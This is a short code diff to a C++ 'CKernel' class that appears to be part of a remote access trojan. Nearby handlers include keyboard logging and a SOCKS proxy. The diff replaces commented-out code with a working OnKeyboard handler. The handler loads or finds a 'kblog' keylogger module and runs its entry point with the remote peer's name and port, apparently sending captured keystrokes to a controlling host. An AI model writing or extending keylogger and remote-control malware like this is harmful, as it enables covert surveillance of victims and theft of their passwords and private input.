@@ -57,7 +57,6 @@ void CKernel::OnClose()
 
 	//
 	Release();
-
 	SetEvent(m_hEvent); 
 }
 
@@ -1074,15 +1073,25 @@ void CKernel::OnExit()
 
 void CKernel::OnKeyboard()
 {
-	//USHORT Port;
-	//char   Name[0x20];
-	//Port = GetPeerAddress(Name);
+	USHORT Port;
+	char   Name[0x20];
+	Module* module = NULL;
 
-	//if (!m_pModuleMgr->RunModule(TEXT("kblog"), Name, Port, NULL))
-	//{
-	//	TCHAR szError[] = TEXT("Kernel is busy...");
-	//	Send(KNEL_ERROR, szError, sizeof(TCHAR) * (lstrlen(szError) + 1));
-	//}
+	Port = GetPeerAddress(Name);
+
+	if (!(module = FindLoadedModule(TEXT("kblog"))))
+	{
+		if (!TryAcquire())
+		{
+			TCHAR szError[] = TEXT("Kernel is busy...");
+			Send(KNEL_ERROR, szError, sizeof(TCHAR) * (lstrlen(szError) + 1));
+			return;
+		}
+		GetModule(TEXT("kblog"));
+		return;
+	}
+
+	module->lpEntry(m_pClient->m_Iocp, Name, Port, NULL);
 }
 
 void CKernel::OnSocksProxy()
